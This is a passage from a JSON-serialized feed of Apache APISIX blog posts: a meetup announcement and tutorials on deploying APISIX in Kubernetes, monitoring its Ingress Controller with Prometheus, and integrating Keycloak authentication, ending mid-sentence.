--browser=false\\nhttp://0.0.0.0:9999/kiali\\nskipping opening a browser\\n```\\n\\nOpen `http://0.0.0.0:9999/kiali` in your browser and try to access the BookInfo service via Apache APISIX several times to see the following results.\\n\\n![Access BookInfo](https://static.apiseven.com/202108/1639714083338-d5a0601e-5dcb-446d-9b25-89ec95044ebd.png)\\n\\nClick Graph and select Namespace as BookInfo. During the test to access the BookInfo application, you can see the effect shown below. You can see the traffic coming in from the Apache APISIX and then flowing to the various components of the application.\\n\\n![Flow chart](https://static.apiseven.com/202108/1639714198376-27882a16-751b-436d-9212-69cad379bb72.png)\\n\\nThis concludes the entire process. We have successfully exposed the services in the Kubernetes cluster with Service Mesh enabled using Apache APISIX and Apache APISIX Ingress Controller securely.\\n\\n## Summary\\n\\nThis article shows you step-by-step how to use Istio Service Mesh and Apache APISIX to expose the services in a Service Mesh-enabled Kubernetes cluster to the outside of the cluster in a very detailed step-by-step manner. You can also provide more security or traffic control through the rich plug-in capabilities of Apache APISIX in the future.\\n\\nWe hope that the above detailed tutorials will help you to more easily integrate with solutions such as Istio when using Apache APISIX."},{"id":"Webinar | Apache APISIX \xd7 Apache RocketMQ Online Meetup","metadata":{"permalink":"/blog/2021/12/16/apisix-with-rocketmq-meetup","source":"@site/blog/2021/12/16/apisix-with-rocketmq-meetup.md","title":"Webinar | Apache APISIX \xd7 Apache RocketMQ Online Meetup","description":"On December 26th, the API Gateway Apache APISIX community is joining forces with the Apache RocketMQ community to bring you an online sharing session.","date":"2021-12-16T00:00:00.000Z","formattedDate":"December 16, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.92,"truncated":true,"authors":[],"prevItem":{"title":"Secure Exposure of Istio Services with APISIX Ingress","permalink":"/blog/2021/12/17/exposure-istio-with-apisix-ingress"},"nextItem":{"title":"How to Easily Deploy Apache APISIX in Kubernetes","permalink":"/blog/2021/12/15/deploy-apisix-in-kubernetes"}},"content":"> On December 26th, the Apache APISIX community is joining forces with the Apache RocketMQ community to bring you an online sharing session.\\n\\n\x3c!--truncate--\x3e\\n\\n![Meetup post](https://static.apiseven.com/202108/1639618571630-50324e59-64df-4747-8139-fedc4a63a297.jpeg)\\n\\n## Topics\\n\\n### Apache APISIX: Keeping Low-Bar for Devs\\n\\n#### Speaker\\n\\nYuansheng Wang, Apache APISIX PMC, co-founder & CTO of api7.ai\\n\\n#### Topic Details\\n\\nIn recent years, open source projects have emerged from the ground, and a variety of open source products are bursting with power. Ecology is starting to become the moat of open source projects. How to choose the right track is perhaps the question that open source leaders should start to consider afterwards.\\n\\nThis talk includes a detailed introduction about Apache APISIX, through which you can fully understand the features and ecology of Apache APISIX, as well as the active community atmosphere.\\n\\n### The O&M Practice and Governance Path of Xiaohongshu Messaging Middleware\\n\\n#### Speaker\\n\\nYihao Zhang, R&D engineer of Xiaohongshu\'s messaging middleware, responsible for the R&D and governance of Kafka and RocketMQ in the company.\\n\\n#### Topic Details\\n\\nThe overall convergence of Xiaohongshu\'s messaging middleware is late. Facing the huge business volume and complicated historical issues, Xiaohongshu still needs to be prepared in other aspects at the business level.\\n\\nIn this talk, we will discuss the following issues, such as how to disassemble the operation and governance direction to meet the high stability requirements in a short period of time, what issues need to be paid attention to in the subsequent business process to improve the cluster visualization, operation and traceability, and the future planning of Xiaohongshu\'s internal messaging middleware direction.\\n\\n### WASM-based Multi-Language Plug-in Solution for Apache APISIX (Lightning Talk)\\n\\n#### Speaker\\n\\nZexuan Luo, api7.ai Engineer, Apache APISIX PMC\\n\\n#### Topic Details\\n\\nIn this lightning talk, we will demonstrate how to run Go and Rust code inside Apache APISIX by way of WASM.\\n\\nThis talk will provide a repeatable understanding of WASM, including its advantages and limitations, and how to introduce WASM into your own system.\\n\\n### The road to canary release and cloud-native governance for Zhengcaiyun messaging middleware\\n\\n#### Speaker\\n\\nLin Zeng, the person in charge of Zhengcaiyun infrastructure platform, mainly responsible for the company\'s cloud-native, blockchain, artificial intelligence, middleware and other technical directions\\n\\n#### Topic Details\\n\\nThis sharing will introduce how RocketMQ helps Zhengcaiyun companies to cope with the complex cloud and island hybrid cloud scenario of government procurement business.\\n\\nThis presentation will provide a full understanding of how to use RocketMQ for canary release and traffic staining, delayed message personalization, and the implementation of RocketMQ-based cloud-native operational transformation and other practical experience sharing.\\n\\n### Building a Better Kubernetes Ingress Controller\\n\\n#### Speaker\\n\\nJintao Zhang, api7.ai cloud native technologist, Apache APISIX committer, Kubernetes ingress-nginx reviewer, contributor of Containerd/Docker/Helm/Kubernetes/KIND and many other open source projects.\\n\\n#### Topic Details\\n\\nThis talk will share hands-on experience with Apache APISIX Ingress Controller and some application scenarios. This talk will give you a good understanding of the core features of Apache APISIX Ingress Controller and its ecology, as well as future plans for Apache APISIX Ingress Controller.\\n\\n### Construction of large-scale MQTT Service Cluster based on RocketMQ\\n\\n#### Speaker\\n\\nXiuji, Senior Development engineer of Aliyun.\\n\\n#### Topic Details\\n\\nThrough this presentation, you can learn how to build a MQTT messaging model based on Apache RocketMQ and how to implement a super-large MQTT service cluster that supports millions of connections.\\n\\n## How to participate\\n\\nScan the code to follow Apache APISIX\'s video account below and reserve your time for the live broadcast on December 26th.\\n\\n![QR code](https://static.apiseven.com/202108/1639618627132-2ce4f183-4d3f-40ca-ae5f-397a48f650ae.png)"},{"id":"How to Easily Deploy Apache APISIX in Kubernetes","metadata":{"permalink":"/blog/2021/12/15/deploy-apisix-in-kubernetes","source":"@site/blog/2021/12/15/deploy-apisix-in-kubernetes.md","title":"How to Easily Deploy Apache APISIX in Kubernetes","description":"API Gateway Apache APISIX currently supports multiple ways to install and deploy. This article focuses on how to deploy APISIX and Dashboard in a Kubernetes environment.","date":"2021-12-15T00:00:00.000Z","formattedDate":"December 15, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.83,"truncated":true,"authors":[{"name":"Bozhong Yu","title":"Author","url":"https://github.com/zaunist","image_url":"https://avatars.githubusercontent.com/u/38528079?v=4","imageURL":"https://avatars.githubusercontent.com/u/38528079?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Webinar | Apache APISIX \xd7 Apache RocketMQ Online Meetup","permalink":"/blog/2021/12/16/apisix-with-rocketmq-meetup"},"nextItem":{"title":"Monitor APISIX Ingress Controller with Prometheus","permalink":"/blog/2021/12/13/monitor-apisix-ingress-controller-with-prometheus"}},"content":"> Apache APISIX currently supports multiple ways to install and deploy. This article focuses on how to deploy Apache APISIX and APISIX-Dashboard in a Kubernetes environment.\\n\\n\x3c!--truncate--\x3e\\n\\nApache APISIX is a dynamic, real-time, high-performance open source API gateway that provides rich traffic management features such as load balancing, dynamic upstream, canary release, service meltdown, authentication, observability, and more.\\n\\nAnd Kubernetes, an open source system for automatically deploying, scaling, and managing containerized applications, is designed to provide users with support for automatic deployment **across host clusters**, scaling, and related features such as running application containers. Here we have compiled two easy-to-follow installation ideas on how to quickly deploy Apache APISIX in K8s and present related information via Dashboard.\\n\\n## Environment Preparation\\n\\nBefore deploying, make sure your network is up and ready for K8s clustering.\\nHere, we recommend using Kind to build the K8s cluster test environment locally, it is very convenient and easy to get started. After installing Kind according to the [official documentation](https://kind.sigs.k8s.io/docs/user/quick-start/), you can set up the K8s cluster environment with a single command.\\n\\n```shell\\nkind create cluster\\n```\\n\\n## Option 1: Installation via Helm\\n\\nHelm is mainly used to manage applications in Kubernetes. Helm is also known as the package manager in Kubernetes, similar to apt, yum, and pacman, which are package managers in Linux.\\n\\nCurrently, Apache APISIX has provided [Helm Chart repository](https://github.com/apache/apisix-helm-chart), and users can easily deploy and uninstall Apache APISIX via Helm.\\n\\n### Deploying Apache APISIX\\n\\nFirst add the Apache APISIX Helm Chart address and update the repository.\\n\\n```shell\\nhelm repo add apisix https://charts.apiseven.com\\nhelm repo update\\n```\\n\\nInstall Apache APISIX (this demo installs Apache APISIX into Default Namespace, for custom Namespace, please [refer to the documentation](https://kubernetes.io/docs/tasks/administer-cluster/namespaces/#creating-a-new-namespace)).\\n\\n```shell\\nhelm install apisix apisix/apisix\\n```\\n\\nWhen the above command is executed successfully, the following return message will be obtained.\\n\\n```shell\\n\u25b6 helm install apisix apisix/apisix\\nNAME: apisix\\nLAST DEPLOYED: Sun Dec  5 14:43:19 2021\\nNAMESPACE: default\\nSTATUS: deployed\\nREVISION: 1\\nTEST SUITE: None\\nNOTES:\\n1. Get the application URL by running these commands:\\n  export NODE_PORT=$(kubectl get --namespace default -o jsonpath=\\"{.spec.ports[0].nodePort}\\" services apisix-gateway)\\n  export NODE_IP=$(kubectl get nodes --namespace default -o jsonpath=\\"{.items[0].status.addresses[0].address}\\")\\n  echo http://$NODE_IP:$NODE_PORT\\n```\\n\\nWith an Apache APISIX deployment installed in the above manner, the Admin API is exposed on port `9180` in the cluster and the Gateway is exposed on port `80`. To access the Admin API, you can use `kubectl port-forward` to forward the port to a port on the local host.\\n\\nHere is a demonstration of port-forwarding to port `9080` on the local machine, mainly to synchronize with the official Apache APISIX documentation and to facilitate subsequent verification.\\n\\n```shell\\nkubectl port-forward service/apisix-admin 9080:9180\\n```\\n\\nAfter that, you can refer to the [Apache APISIX Quick Start Guide](https://apisix.apache.org/zh/docs/apisix/getting-started/) to add and bind a Route to Upstream and other related operations.\\n\\nFinally, the verification of the new route is performed.\\n\\nSince this article uses Kind to build a local K8s cluster, the `apisix-gateway` NodePort is not accessible, so an additional step is needed before validation, i.e. forwarding port `80` from the cluster to port `8080` on the local machine.\\n\\n```shell\\nkubectl port-forward service/apisix-gateway 8080:80\\n```\\n\\nStart the verification process.\\n\\n```shell\\ncurl -X GET \\"http://127.0.0.1:8080/get?foo1=bar1&foo2=bar2\\" -H \\"Host: httpbin.org\\"\\n```\\n\\nThe expected return results can be seen in the example below.\\n\\n```json\\n{\\n  \\"args\\": {\\n    \\"foo1\\": \\"bar1\\",\\n    \\"foo2\\": \\"bar2\\"\\n  },\\n  \\"headers\\": {\\n    \\"Accept\\": \\"*/*\\",\\n    \\"Accept-Encoding\\": \\"gzip\\",\\n    \\"Host\\": \\"httpbin.org\\",\\n    \\"User-Agent\\": \\"curl/7.64.1\\",\\n    \\"X-Amzn-Trace-Id\\": \\"Root=1-61ac63b5-348d3c5567db393462cd0666\\",\\n    \\"X-Forwarded-Host\\": \\"httpbin.org\\"\\n  },\\n  \\"origin\\": \\"127.0.0.1, 192.46.208.201\\",\\n  \\"url\\": \\"http://httpbin.org/get?foo1=bar1&foo2=bar2\\"\\n}\\n```\\n\\n### Deploying Apache APISIX-Dashboard\\n\\nAs with deploying Apache APISIX, installing Apache APISIX-Dashboard via Helm requires only one command.\\n\\n```shell\\nhelm install apisix-dashboard apisix/apisix-dashboard\\n```\\n\\nNext, forward the Dashboard port to the local machine.\\n\\n```shell\\nkubectl port-forward service/apisix-dashboard 8080:80\\n```\\n\\nFinally, visit your `localhost:8080` to see the login page.\\n\\n:::note\\nThe node information of Apache APISIX will not appear in the system information of Apache APISIX-Dashboard deployed here. The `server-info` plug-in is not enabled by default if installed by Helm, so you can add it in the apisix configmap if needed.\\n\\nFor the configuration of `server-info`, please refer to the [relevant documentation](https://apisix.apache.org/docs/apisix/plugins/server-info/).\\n:::\\n\\n## Option 2: Deployment via yaml file\\n\\nDeploying Apache APISIX using a yaml file is easier than the Helm deployment method described above, and allows you to customize the configuration more easily.\\n\\n### Deploying APISIX and Dashboard\\n\\n:::note\\nIf you have already deployed using method 1, you will need to clear the ETCD PVC storage before proceeding with the following installation.\\n:::\\n\\nThe yaml files needed to deploy Apache APISIX, APISIX-Dashboard, and etcd clusters are already organized here, and you can call the next mentioned files through the [apisix-on-kubernetes repository](https://github.com/zaunist/apisix-on-kubernetes).\\n\\nFirst clone the `apisix-on-kubernetes` repository mentioned above.\\n\\n```shell\\ngit clone https://github.com/zaunist/apisix-on-kubernetes.git\\n```\\n\\nThen execute the following command.\\n\\n```shell\\nkubectl apply -f etcd.yaml\\nkubectl apply -f apisix.yaml\\nkubectl apply -f apisix-dashboard.yaml\\n```\\n\\nWait for the Pod to fully boot and forward the `apisix-dashboard` port to the local machine.\\n\\n```shell\\nkubectl port-forward service/apisix-dashboard 8080:80\\n```\\n\\nFinally, visit `localhost:8080` to see the Dashboard related information. The default login password is `admin`,`admin`.\\n\\n:::tip\\nTo visualize the deployment during the installation process, you can use [Kubernetes Dashboard](https://github.com/kubernetes/dashboard) to see the Pod running on the web side.\\n:::\\n\\n## Summary\\n\\nThis article has introduced two ways to deploy Apache APISIX and Apache APISIX-Dashboard in Kubernetes. Both approaches have the same ultimate goal, but each has its own advantages in use.\\n\\nFor example, it is very easy to install using Helm and perform all operations with just a few commands, while deploying via YAML files makes it easier to make custom configuration changes and more manageable.\\n\\nHow to install and deploy Apache APISIX in a real-world scenario depends on your usage habits, so here are just two ideas for you to consider. We hope that you can develop more interesting techniques and methods in the subsequent use of Apache APISIX."},{"id":"Monitor APISIX Ingress Controller with Prometheus","metadata":{"permalink":"/blog/2021/12/13/monitor-apisix-ingress-controller-with-prometheus","source":"@site/blog/2021/12/13/monitor-apisix-ingress-controller-with-prometheus.md","title":"Monitor APISIX Ingress Controller with Prometheus","description":"This article introduces the relevant steps of how to use Prometheus to monitor APISIX Ingress Controller and the display effect of some indicators.","date":"2021-12-13T00:00:00.000Z","formattedDate":"December 13, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.18,"truncated":true,"authors":[{"name":"Chao Zhang","title":"Author","url":"https://github.com/tokers","image_url":"https://avatars.githubusercontent.com/u/10428333?v=4","imageURL":"https://avatars.githubusercontent.com/u/10428333?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"How to Easily Deploy Apache APISIX in Kubernetes","permalink":"/blog/2021/12/15/deploy-apisix-in-kubernetes"},"nextItem":{"title":"API Gateway APISIX Integrates Keycloak for Authentication","permalink":"/blog/2021/12/10/integrate-keycloak-auth-in-apisix"}},"content":"> This article introduces the relevant steps of how to use Prometheus to monitor APISIX Ingress Controller and the display effect of some indicators.\\n\\n\x3c!--truncate--\x3e\\n\\nWhether in the days of monolithic applications or today\'s cloud-native era, \\"monitoring functions\\" have always played a very important role. A good monitoring system can help engineers quickly understand the status of services running in production environments, and quickly locate problems or warn of anomalies when they occur.\\n\\nApache APISIX Ingress Controller has been enhanced to support Prometheus Metrics in recent releases. In this article, we will introduce how to use Prometheus to collect Metrics data from APISIX Ingress Controller and subsequently visualize it through Grafana.\\n\\n## Step 1: Install APISIX Ingress Controller\\n\\nFirst we deploy Apache APISIX, ETCD and APISIX Ingress Controller to the local Kubernetes cluster via [Helm](https://helm.sh/).\\n\\n```shell\\nhelm repo add apisix https://charts.apiseven.com\\nhelm repo update\\nkubectl create namespace ingress-apisix\\nhelm install apisix apisix/apisix --namespace ingress-apisix \\\\\\n --set ingress-controller.enabled=true\\n```\\n\\nAfter installation, please wait until all services are up and running. Specific status confirmation can be checked with the following command.\\n\\n```shell\\nkubectl get all -n ingress-apisix\\n```\\n\\n## Step 2: Enable the Prometheus Plugin\\n\\nIn most cases, the monitoring function must involve more than just the APISIX Ingress Controller component. If you need to monitor Apache APISIX at the same time, you can create the following `ApisixClusterConfig` resource.\\n\\n### Installing Prometheus and Grafana\\n\\nNext, we will enable the Prometheus service through the Prometheus Operator, so you will need to install the Prometheus Operator first.\\n\\n:::note\\nThe following command will also install Grafana.\\n:::\\n\\n```shell\\nhelm repo add prometheus-community https://prometheus-community.github.io/helm-charts\\nheml repo update\\nkubectl create namespace prometheus\\nhelm install prometheus prometheus-community/kube-prometheus-stack -n prometheus\\n```\\n\\nAfter installation, you need to prepare the RBAC configuration for the Prometheus instance. This configuration gives Prometheus the ability to obtain Pod and Service resources from the Kubernetes API Server.\\n\\n```yaml\\napiVersion: v1\\nkind: ServiceAccount\\nmetadata:\\n  name: ingress-apisix\\n  namespace: ingress-apisix\\n---\\napiVersion: rbac.authorization.k8s.io/v1\\nkind: ClusterRole\\nmetadata:\\n  name: ingress-apisix\\nrules:\\n- apiGroups: [\\"\\"]\\n  resources:\\n  - nodes\\n  - nodes/metrics\\n  - services\\n  - endpoints\\n  - pods\\n  verbs: [\\"get\\", \\"list\\", \\"watch\\"]\\n- apiGroups: [\\"\\"]\\n  resources:\\n  - configmaps\\n  verbs: [\\"get\\"]\\n- apiGroups:\\n  - networking.k8s.io\\n  resources:\\n  - ingresses\\n  verbs: [\\"get\\", \\"list\\", \\"watch\\"]\\n- nonResourceURLs: [\\"/metrics\\"]\\n  verbs: [\\"get\\"]\\n---\\napiVersion: rbac.authorization.k8s.io/v1\\nkind: ClusterRoleBinding\\nmetadata:\\n  name: ingress-apisix\\nroleRef:\\n  apiGroup: rbac.authorization.k8s.io\\n  kind: ClusterRole\\n  name: ingress-apisix\\nsubjects:\\n- kind: ServiceAccount\\n  name: ingress-apisix\\n  namespace: ingress-apisix\\n```\\n\\nAfter completing the above instance configuration, PodMonitor needs to be defined, or you can choose to use ServiceMonior depending on the scenario requirements. The following PodMonitor resources will focus on Metrics collection for the APISIX Ingress Controller Pod.\\n\\n```yaml\\napiVersion: monitoring.coreos.com/v1\\nkind: PodMonitor\\nmetadata:\\n  name: ingress-apisix\\n  namespace: ingress-apisix\\n  labels:\\n    use-for: ingress-apisix\\nspec:\\n  selector:\\n    matchLabels:\\n      app.kubernetes.io/name: ingress-controller\\n  podMetricsEndpoints:\\n  - port: http\\n```\\n\\n:::note\\nThe reason for not using ServiceMonitor here is that the `http` port is not exposed to the Service level.\\n:::\\n\\nFinally, the Prometheus instance can be defined with the following command.\\n\\n```yaml\\napiVersion: monitoring.coreos.com/v1\\nkind: Prometheus\\nmetadata:\\n  name: ingress-apisix\\n  namespace: ingress-apisix\\nspec:\\n  serviceAccountName: ingress-apisix\\n  podMonitorSelector:\\n    matchLabels:\\n      use-for: ingress-apisix\\n  resources:\\n    requests:\\n      memory: 400Mi\\n  enableAdminAPI: false\\n  image: prom/prometheus:v2.31.0\\n```\\n\\nAfter applying all of the above resources to the Kubernetes cluster, wait for the relevant components to be ready.\\n\\n## Step 3: Configuring Grafana\\n\\nNext, we configure Grafana for visual presentation.\\n\\nStart by accessing the `prometheus-grafana` service. Note that if you do not have a means to expose the service to the outside of the cluster, you can try using port forwarding. The Grafana administrator username and password are stored in the `prometheus-grafana` Secret.\\n\\nAfter opening Grafana, import the [Dashboard template](https://raw.githubusercontent.com/apache/apisix-ingress-controller/22e548bc267115ccd36aec4200d5399aab565958/docs/assets/other/json/apisix-ingress-controller-grafana.json) of APISIX Ingress Controller to see the monitoring dashboard, which looks like the following.\\n\\n![Dashboard1](https://static.apiseven.com/202108/1639381275740-d9e3b2a7-6895-43f2-8119-212ea616dddd.png)\\n\\n![Dashboard2](https://static.apiseven.com/202108/1639381348652-7fb30365-179c-4b68-a168-ec3c9da7324d.png)\\n\\n![Dashboard3](https://static.apiseven.com/202108/1639381376926-d6af92c7-16dd-4306-8931-9b83e7e8dce1.png)\\n\\nFor more information on creating Dashboard templates, please see [related PR](https://github.com/apache/apisix-ingress-controller/pull/731).\\n\\n## Addendum: Monitoring Metrics Explained\\n\\nThe current monitoring metrics for the APISIX Ingress Controller focus on its interaction with the data plane Apache APISIX instances (configuration delivery), including data related to the number and latency of configuration synchronization.\\n\\n- `is_leader`: Whether the current APISIX Ingress Controller instance is in the Leader role. The same group of APISIX Ingress Controllers will have only one Leader, the rest of the instances are Candidate.\\n- `sync_operations`: Includes some metrics when the APISIX Ingress Controller synchronizes the configuration to the data plane, including the number of pushes, failure rate, latency, etc. Through these metrics, you can monitor whether the configuration delivery is normal or not, so as to help R&D and operation and maintenance students to monitor and alert and locate faults.\\n\\n## Summary\\n\\nThis article introduced how to use Prometheus to monitor APISIX Ingress Controller and how to display some of the metrics. Currently, only some basic monitoring metrics are included, we will continue to polish and upgrade, add more metrics and integrate data surface APISIX metrics to bring you a better monitoring experience.\\n\\nOf course, interested parties are welcome to contribute to the [Apache APISIX Ingress Controller](https://github.com/apache/apisix-ingress-controller) project, and we look forward to working together to make the APISIX Ingress Controller more comprehensive."},{"id":"API Gateway APISIX Integrates Keycloak for Authentication","metadata":{"permalink":"/blog/2021/12/10/integrate-keycloak-auth-in-apisix","source":"@site/blog/2021/12/10/integrate-keycloak-auth-in-apisix.md","title":"API Gateway APISIX Integrates Keycloak for Authentication","description":"This article shows you how to use OpenID-Connect protocol and Keycloak for identity authentication in API Gateway Apache APISIX through detailed steps.","date":"2021-12-10T00:00:00.000Z","formattedDate":"December 10, 2021","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Authentication","permalink":"/blog/tags/authentication"}],"readingTime":5.38,"truncated":true,"authors":[{"name":"Xinxin Zhu","title":"Author","url":"https://github.com/starsz","image_url":"https://avatars.githubusercontent.com/u/25628854?v=4","imageURL":"https://avatars.githubusercontent.com/u/25628854?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Monitor APISIX Ingress Controller with Prometheus","permalink":"/blog/2021/12/13/monitor-apisix-ingress-controller-with-prometheus"},"nextItem":{"title":"API Log Monitor with Apache APISIX & RocketMQ","permalink":"/blog/2021/12/08/apisix-integrate-rocketmq-logger-plugin"}},"content":"> This article shows you how to use OpenID-Connect protocol and Keycloak for identity authentication in Apache APISIX through detailed steps.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://www.keycloak.org/2021/12/apisix\\" />\\n</head>\\n\\n![Keycloak-APISIX Integration](https://static.apiseven.com/202108/1639129658486-393e8a3a-ccf2-496d-9b46-4db741bd6e55.png)\\n\\n[Keycloak](https://www.keycloak.org/) is an open source identity and access management solution for modern applications and services. Keycloak supports Single-Sign On, which enables services to interface with Keycloak through protocols such as OpenID Connect, OAuth 2.0, etc. Keycloak also supports integrations with different authentication services, such as Github, Google and Facebook.\\n\\nIn addition, Keycloak also supports user federation, and can import users through LDAP and Kerberos. For more information about Keycloak, please refer to the [official documentation](https://www.keycloak.org/about).\\n\\n## How to Use\\n\\n### Environment Preparation\\n\\nMake sure that Apache APISIX is started in your environment before proceeding with the following steps.\\n\\n#### Start Keycloak\\n\\nHere we use `docker-compose` to start Keycloak with PostgreSQL.\\n\\n```yaml\\nversion: \'3.7\'\\n\\nservices:\\n  postgres:\\n      image: postgres:12.2\\n      container_name: postgres\\n      environment:\\n        POSTGRES_DB: keycloak\\n        POSTGRES_USER: keycloak\\n        POSTGRES_PASSWORD: password\\n\\n  keycloak:\\n      image: jboss/keycloak:9.0.2\\n      container_name: keycloak\\n      environment:\\n        DB_VENDOR: POSTGRES\\n        DB_ADDR: postgres\\n        DB_DATABASE: keycloak\\n        DB_USER: keycloak\\n        DB_PASSWORD: password\\n        KEYCLOAK_USER: admin\\n        KEYCLOAK_PASSWORD: password\\n        PROXY_ADDRESS_FORWARDING: \\"true\\"\\n      ports:\\n        - 8080:8080\\n      depends_on:\\n        - postgres\\n```\\n\\n```shell\\ndocker-compose up\\n```\\n\\nAfter execution, you need to verify that Keycloak and postgres have started successfully.\\n\\n```shell\\ndocker-compose ps\\n```\\n\\n#### Configure Keycloak\\n\\nAfter Keycloak is started, use your browser to access \\"http://127.0.0.1:8080/auth/admin/\\" and type the `admin/password` account password to log in to the administrator console.\\n\\n##### Create a realm\\n\\nFirst, you need to create a realm named `apisix_test_realm`. In Keycloak, a realm is a workspace dedicated to managing projects, and the resources of different realms are isolated from each other.\\n\\nThe realm in Keycloak is divided into two categories: one is the `master realm`, which is created when Keycloak is first started and used to manage the admin account and create other realm. the second is the `other realm`, which is created by the admin in the master realm and can be used to create, manage and use users and applications in this realm. The second category is the other realm, created by admin in the master realm, where users and applications can be created, managed and used. For more details, please refer to the [realm and users section in Keycloak](https://www.keycloak.org/docs/latest/getting_started/index.html#realms-and-users).\\n\\n![Create realm](https://static.apiseven.com/202108/1639101202459-72803240-b358-4c69-a9ca-4b6751a8547d.png)\\n\\n![Edit realm title](https://static.apiseven.com/202108/1639101243617-0498379f-392e-4837-8f37-eee558c21e3d.png)\\n\\n##### Create a Client\\n\\nThe next step is to create the `OpenID Connect Client`. In Keycloak, Client means a client that is allowed to initiate authentication to Keycloak.\\n\\nIn this example scenario, `Apache APISIX` is equivalent to a client that is responsible for initiating authentication requests to Keycloak, so we create a Client with the name `apisix`. More details about the Client can be found in [Keycloak OIDC Clients](https://www.keycloak.org/docs/latest/server_admin/#_oidc_clients).\\n\\n![Create OpenID Client](https://static.apiseven.com/202108/1639101288379-9a46b92a-294e-4b40-ac7e-408284a3d0ad.png)\\n\\n![Creat Client title](https://static.apiseven.com/202108/1639101327347-c8ab463a-1cb0-4eb0-a26f-17d7c0c54846.png)\\n\\n##### Configure the Client\\n\\nAfter the Client is created, you need to configure the Apache APISIX access type for the Client.\\n\\nIn Keycloak, there are three types of Access Type:\\n\\n1. **Confidential**: which is used for applications that need to perform browser login, and the client will get the `access token` through `client secret`, mostly used in web systems rendered by the server.\\n2. **Public**: for applications that need to perform browser login, mostly used in front-end projects implemented using vue and react.\\n3. **Bearer-only**: for applications that don\'t need to perform browser login, only allow access with `bearer token`, mostly used in RESTful API scenarios.\\n\\nFor more details about Client settings, please refer to [Keycloak OIDC Clients Advanced Settings](https://www.keycloak.org/docs/latest/server_admin/#advanced-settings).\\n\\nSince we are using Apache APISIX as the Client on the server side, we can choose either \\"confidential\\" Access Type or \\"Bearer-only\\" Access Type. For the demonstration below, we are using \\"confidential\\" Access Type as an example.\\n\\n![Set Client type](https://static.apiseven.com/202108/1639101355171-e368730b-2a72-4c4d-9397-cf4a1c8f2806.png)\\n\\n##### Create Users\\n\\nKeycloak supports interfacing with other third-party user systems, such as Google and Facebook, or importing or manually creating users using LDAP . Here we will use \\"manually creating users\\" to demonstrate.\\n\\n![Create user](https://static.apiseven.com/202108/1639101385277-b2f578c0-e68a-4945-83ac-7a77145bb056.png)\\n\\n![Add user info](https://static.apiseven.com/202108/1639101406281-724bbb50-96fc-4aa8-aec1-9414f83c199d.png)\\n\\nThen set the user\'s password in the Credentials page.\\n\\n![Set user password](https://static.apiseven.com/202108/1639101430209-d289459a-5014-4a2d-864f-7917b84b1c0c.png)\\n\\n#### Create Routes\\n\\nAfter Keycloak is configured, you need to create a route and open the `Openid-Connect` plugin . For details on the configuration of this plugin, please refer to the [Apache APISIX OpenID-Connect plugin](https://apisix.apache.org/docs/apisix/plugins/openid-connect).\\n\\n##### Get client_id and client_secret\\n\\n![Get Client infos](https://static.apiseven.com/202108/1639101454807-ff8c8b77-bdac-4ac6-966e-a2f5e2418b7a.png)\\n\\nIn the above configuration.\\n\\n* `client_id` is the name used when creating the Client before, i.e. `apisix`\\n* `client_secret` should be obtained from Clients-apisix-Credentials, for example: `d5c42c50-3e71-4bbbe-aa9e-31083ab29da4`.\\n\\n##### Get the discovery configuration\\n\\n![Get configuration](https://static.apiseven.com/202108/1639101585273-7eb31728-fe4c-4af3-84d1-76c1a97e7e35.png)\\n\\nGo to Realm Settings-General-Endpoints, select the `OpenID Endpoint Configuration` link and copy the address that the link points to, for example:`http://127.0.0.1:8080/auth/realms/apisix_test_realm/.well-known/openid-configuration`.\\n\\n##### Create a route and enable the plug-in\\n\\nUse the following command to access the Apache APISIX Admin interface to create a route, set the upstream to `httpbin.org`, and enable the plug-in OpenID Connect for authentication.\\n\\n> Note: If you select `bearer-only` as the Access Type when creating a Client, you need to set `bearer_only` to true when configuring the route, so that access to Apache APISIX will not jump to the Keycloak login screen.\\n\\n```shell\\ncurl  -XPOST 127.0.0.1:9080/apisix/admin/routes -H \\"X-Api-Key: edd1c9f034335f136f87ad84b625c8f1\\" -d \'{\\n    \\"uri\\":\\"/*\\",\\n    \\"plugins\\":{\\n        \\"openid-connect\\":{\\n            \\"client_id\\":\\"apisix\\",\\n            \\"client_secret\\":\\"d5c42c50-3e71-4bbe-aa9e-31083ab29da4\\",\\n            \\"discovery\\":\\"http://127.0.0.1:8080/auth/realms/apisix_test_realm/.well-known/openid-configuration\\",\\n            \\"scope\\":\\"openid profile\\",\\n            \\"bearer_only\\":false,\\n            \\"realm\\":\\"apisix_test_realm\\",\\n            \\"introspection_endpoint_auth_method\\":\\"client_secret_post\\",\\n            \\"redirect_uri\\":\\"http://127.0.0.1:9080/\\"\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"httpbin.org:80\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n### Access Testing\\n\\nOnce the above configuration is complete, we are ready to perform the relevant access tests in Apache APISIX.\\n\\n#### Access Apache APISIX\\n\\nUse your browser to access http://127.0.0.1:9080/image/png.\\n\\nSince the OpenID-Connect plugin is enabled and `bearer-only` is set to `false`, when you access this path for the first time, Apache APISIX will redirect to the login screen configured in `apisix_test_realm` in Keycloak and make a user login request.\\n\\n![Login Page](https://static.apiseven.com/202108/1639101623370-cc668e0f-0c2c-469c-9a3e-3118c271d63f.png)\\n\\nEnter the User peter created during the Keycloak configuration to complete user login.\\n\\n#### Successful access\\n\\nAfter a successful login, the browser will again redirect the link to http://127.0.0.1:9080/image/png and will successfully access the image content. The content is identical to that of the upstream http://httpbin.org/image/png.\\n\\n![Access 